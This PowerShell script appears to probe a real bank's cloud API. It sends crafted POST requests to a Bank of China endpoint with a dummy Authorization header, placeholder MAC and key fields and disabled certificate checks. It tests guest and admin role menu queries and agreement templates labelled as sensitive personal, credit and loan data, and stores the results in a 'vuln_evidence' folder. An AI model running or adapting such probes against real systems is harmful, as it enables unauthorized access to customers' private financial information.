$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"

# Test with array format for roleIds and more templateIds - use ASCII only
$testCases = @(
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; roleIds=@("styy-guest"); sysId="M39"; desc="roleIds as array"},
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; roleIds=@("ywzg"); sysId="M39"; desc="admin role ywzg"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1360001"; desc="sensitive personal info auth"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1360002"; desc="external provide auth"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1260000"; desc="loan application form 10"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1210001"; desc="credit info auth 4"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1210000"; desc="loan application form 9"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1160001"; desc="credit info auth 3"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1160000"; desc="loan application form 8"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1060015"; desc="09271958"},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; templateId="FDC1110003"; desc="credit info auth 2"},
    @{TranCode="AGRE-AGRE/queryAgreementTemplateList"; desc="template list"}
)

$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
$idx = 0
foreach ($tc in $testCases) {
    $idx++
    $api = $tc.TranCode
    $parts = $api -split '/'
    $service = $parts[1]
    $desc = if ($tc.ContainsKey("desc")) { $tc.desc } else { "" }

    $bodyObj = @{
        Header = @{
            CurrentPageNum = 1
            PageTotalNum = 10
            NoRetCode = $true
            BranchId = "800000"
            LegalRepCode = "10000"
            TranTeller = ""
            TranCode = $api
            TranDate = "20260716"
            TranTime = "004500000"
            ServiceName = $service
            ServiceCode = "D20190130"
            AuthFlag = "0"
            AuthrTellerNo = "1"
            Channel = "39"
            ConsumerId = "1"
            GlobalSeq = "1"
            GlobalSeqNo = "1"
            KeyId = "1"
            LocalLang = "1"
            Mac = "1"
            SourceSysId = "1111"
            TerminalCode = "1121"
            TranSeq = "1"
            TranSeqNo = "1"
            TranTellerNo = "1"
            ExtendContent = "1"
            TotalNum = "0"
        }
    }
    $extraKeys = $tc.Keys | Where-Object { $_ -ne "TranCode" -and $_ -ne "desc" }
    foreach ($k in $extraKeys) {
        $bodyObj[$k] = $tc[$k]
    }
    $body = $bodyObj | ConvertTo-Json -Depth 5 -Compress

    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $body)

    Write-Host "[$idx/$($testCases.Count)] $api ($desc)"

    $resp = curl.exe -sk --noproxy "*" --max-time 15 -X POST "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest" -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary "@$tempFile" 2>&1
    Remove-Item $tempFile -Force

    $retCode = ""
    $retMsg = ""
    if ($resp -match '"RetCode":"([^"]*)"') { $retCode = $Matches[1] }
    if ($resp -match '"RetMsg":"([^"]*)"') { $retMsg = $Matches[1] }

    $status = if ($retCode -eq "000000") { "SUCCESS" } elseif ($retCode) { "ERR:$retCode" } else { "OTHER" }
    Write-Host "    Status: $status | RetCode=$retCode RetMsg=$retMsg | Size=$($resp.Length)"
    
    $preview = if ($resp.Length -gt 400) { $resp.Substring(0,400) + "..." } else { $resp }
    Write-Host "    Response: $preview"
    Write-Host ""
    Start-Sleep -Milliseconds 300
}
